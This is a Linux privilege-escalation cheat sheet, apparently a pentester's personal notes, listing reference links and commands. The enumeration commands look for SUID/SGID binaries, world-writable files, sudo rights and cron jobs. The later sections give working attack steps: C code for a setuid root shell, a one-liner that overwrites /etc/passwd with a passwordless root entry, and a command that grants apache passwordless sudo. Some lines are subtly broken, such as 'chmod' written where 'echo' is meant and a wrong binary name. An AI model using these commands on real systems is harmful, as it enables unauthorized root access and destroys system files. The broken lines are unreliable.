
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#@  
#@  PRIVILEGE ESCALATION TACTICS LINUX
#@  
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-06[Aug-Thu]16-12PM 

##https://medium.com/@ratiros01/tryhackme-common-linux-privesc-b9424aeee36f
##https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
##https://book.hacktricks.xyz/linux-unix/privilege-escalation

##https://github.com/Ignitetechnologies/Privilege-Escalation
##https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
##https://guide.offsecnewbie.com/privilege-escalation/linux-pe
##https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
##https://f1uffygoat.com/privesc/

##https://github.com/spencerdodd/kernelpop

==
COMMON STUFF
==

##https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

Kernel exploits
Programs running as root
Installed software
Weak/reused/plaintext passwords
Inside service
Suid misconfiguration
Abusing sudo-rights
World writable scripts invoked by root
Bad path configuration
Cronjobs
Unmounted filesystems

==
ABUSING SUID/GUID FILES
==

find / -perm -u=s -type f 2>/dev/null

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

==
CHECK FOR PROCESSES RUNNING AS ROOT
==

ps -aux | grep root

==
PRINTS WORLD WRITABLE FILES
==

find / -perm -2 -type f 2>/dev/null

find / -perm -2 -type f 2>/dev/null | grep -v /proc/ | grep -v /sys/fs

==
CHECK SOFTWARE INSTALLED
==

dpkg -l #Debian
rpm -qa #Centos

==
CHECK SUDO
==

sudo -l

==
CHECK CRON
==

crontab -l 2>/dev/null
ls -alh /var/spool/cron 2>/dev/null
ls -al /etc/ | grep cron 2>/dev/null
ls -al /etc/cron* 2>/dev/null
cat /etc/cron* 2>/dev/null
cat /etc/at.allow 2>/dev/null
cat /etc/at.deny 2>/dev/null
cat /etc/cron.allow 2>/dev/null
cat /etc/cron.deny 2>/dev/null
cat /etc/crontab 2>/dev/null
cat /etc/anacrontab 2>/dev/null
cat /var/spool/cron/crontabs/root 2>/dev/null

==
GENERATE SUID C SHELL FOR /bin/bash
==

nano name.c

int main() {
    setuid(0);
    system("/bin/bash -p");
}

gcc -o name name.c
./name

ANOTHER WAY

nano rootshell.c

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
	setuid(0);
	setgid(0);
	execl("/bin/bash", "bash", NULL);
}

gcc -o rootshell rootshell.c
./name

ONE LINER

echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c

==
FORCE CHANGE TO /etc/passwd, ALLOW ROOT SHELL, NO PASSWORD, IF INCORRECT PERMS
==

echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su

==
ADD APACHE TO SUDO
==

chmod 'chmod 777 /etc/sudoers && echo "apache ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update

